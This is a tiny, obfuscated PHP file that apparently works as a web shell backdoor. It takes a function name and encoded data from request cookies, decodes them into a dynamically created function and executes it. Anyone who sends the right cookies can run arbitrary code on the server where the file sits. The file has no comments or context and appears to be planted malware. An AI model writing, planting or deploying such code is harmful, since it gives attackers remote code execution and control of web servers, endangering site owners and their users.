<?php

$folnz=$_COOKIE;
$cfxde=$folnz[hsoh];
if($cfxde){
	$wcks=$cfxde($folnz[jjzs]);$pwcw=$cfxde($folnz[acxw]);$lrgdy=$wcks("",$pwcw);$lrgdy();
}